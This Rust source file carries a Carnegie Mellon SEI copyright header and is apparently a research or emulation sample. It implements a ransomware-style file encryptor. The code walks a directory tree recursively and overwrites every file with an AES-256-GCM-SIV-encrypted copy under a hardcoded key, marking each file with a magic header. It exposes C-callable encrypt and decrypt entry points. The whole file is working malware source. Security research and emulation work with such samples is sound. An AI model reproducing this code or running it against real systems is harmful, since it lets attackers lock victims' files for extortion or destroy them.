
// Copyright 2022 Carnegie Mellon University.
// Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
// root or contact permission@sei.cmu.edu for full terms.

use aes_gcm_siv::aead::{AeadInPlace, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use rand::prelude::*;
use rand_chacha::ChaCha20Rng;
use std::ffi::CStr;
use std::fs::{self, File};
use std::io::{self, prelude::*};
use std::os::raw::c_char;
use std::path::Path;

macro_rules! debug {
    ($($e:expr),+) => {
        {
            #[cfg(debug_assertions)]
            {
                println!($($e),+)
            }
            #[cfg(not(debug_assertions))]
            {
                ($($e),+)
            }
        }
    };
}

macro_rules! errors {
    ($e:expr) => {
        io::Error::new(io::ErrorKind::Other, $e)
    };
}

const KEY: &[u8; 32] = b"E\xb7s\xf6t\xf5k\x16e\x96<\xb2\xd9\x0e\xa3\xb6\xde\x81u\xa6\x0c\x0e\xb4rs\xb3\xb8}!\x86\x866";
const MAGIC: &[u8; 32] = &[
    16, 31, 14, 21, 9, 7, 22, 25, 10, 27, 15, 2, 23, 30, 5, 26, 4, 11, 24, 1, 19, 29, 3, 28, 18,
    6, 8, 0, 12, 13, 17, 20,
];
const NONCE_LEN: usize = 12;

enum Mode {
    Encrypt,
    Decrypt,
}

fn get_file_contents(path: &Path) -> io::Result<Vec<u8>> {
    let mut file_contents = Vec::new();
    let mut f = File::open(path)?;
    f.read_to_end(&mut file_contents)?;
    Ok(file_contents)
}

fn overwrite_file_contents(path: &Path, args: &[&[u8]]) -> io::Result<()> {
    let mut f = File::create(path)?;
    for arg in args {
        f.write_all(arg)?;
    }
    f.flush()?;
    Ok(())
}

fn encrypt<R: rand::RngCore + rand::CryptoRng>(path: &Path, rng: &mut R) -> io::Result<()> {
    let key = Key::from_slice(KEY);
    let cipher = Aes256GcmSiv::new(key);

    let mut nonce_slice = [0u8; NONCE_LEN];
    rng.fill_bytes(&mut nonce_slice);
    let nonce = Nonce::from_slice(&nonce_slice);

    let mut file_contents = get_file_contents(&path)?;

    if file_contents.starts_with(MAGIC) {
        return Err(errors!("given file is already encrypted"));
    }

    if let Err(e) = cipher.encrypt_in_place(nonce, b"", &mut file_contents) {
        return Err(errors!(e.to_string()));
    };

    overwrite_file_contents(&path, &[MAGIC, &nonce_slice, file_contents.as_ref()])?;
    Ok(())
}

fn decrypt(path: &Path) -> io::Result<()> {
    let key = Key::from_slice(KEY);
    let cipher = Aes256GcmSiv::new(key);

    let mut file_contents = get_file_contents(&path)?;

    if file_contents.len() < MAGIC.len() + NONCE_LEN {
        return Err(errors!("given file is not encrypted"));
    }

    let mut magic_bytes = [0u8; MAGIC.len()];
    for (i, byte) in file_contents.drain(..magic_bytes.len()).enumerate() {
        magic_bytes[i] = byte;
    }

    if &magic_bytes != MAGIC {
        return Err(errors!("given file is not encrypted"));
    }

    let mut nonce_bytes = [0u8; NONCE_LEN];
    for (i, byte) in file_contents.drain(..nonce_bytes.len()).enumerate() {
        nonce_bytes[i] = byte;
    }
    let nonce = Nonce::from_slice(&nonce_bytes);

    if let Err(e) = cipher.decrypt_in_place(nonce, b"", &mut file_contents) {
        return Err(errors!(e.to_string()));
    }

    overwrite_file_contents(&path, &[file_contents.as_ref()])?;

    Ok(())
}

fn visit_files<R: rand::RngCore + rand::CryptoRng>(
    top_dir: &Path,
    mode: &Mode,
    rng: &mut R,
) -> io::Result<()> {
    if !top_dir.is_dir() {
        return Err(errors!("given path is not a directory"));
    };
    for entry in fs::read_dir(top_dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            visit_files(&path, &mode, rng)?;
        } else if path.is_file() {
            debug!("Found: {}", &path.to_str().unwrap());
            if let Err(e) = match mode {
                Mode::Encrypt => encrypt(&path, rng),
                Mode::Decrypt => decrypt(&path),
            } {
                debug!("{}", e);
            }
        }
    }

    Ok(())
}

fn encryption_internal(top_dir: *const c_char, mode: &Mode) -> bool {
    let path = match unsafe { CStr::from_ptr(top_dir) }.to_str() {
        Ok(s) => s,
        Err(e) => {
            debug!("Failed to convert char pointer to string: {}", e);
            return false;
        }
    };
    let mut rng = ChaCha20Rng::from_entropy();
    match visit_files(Path::new(path), mode, &mut rng) {
        Ok(_) => true,
        Err(_) => false,
    }
}

#[no_mangle]
pub extern "C" fn encrypt_files(top_dir: *const c_char) -> bool {
    encryption_internal(top_dir, &Mode::Encrypt)
}

#[no_mangle]
pub extern "C" fn decrypt_files_abcdefghijklmnop(top_dir: *const c_char) -> bool {
    encryption_internal(top_dir, &Mode::Decrypt)
}

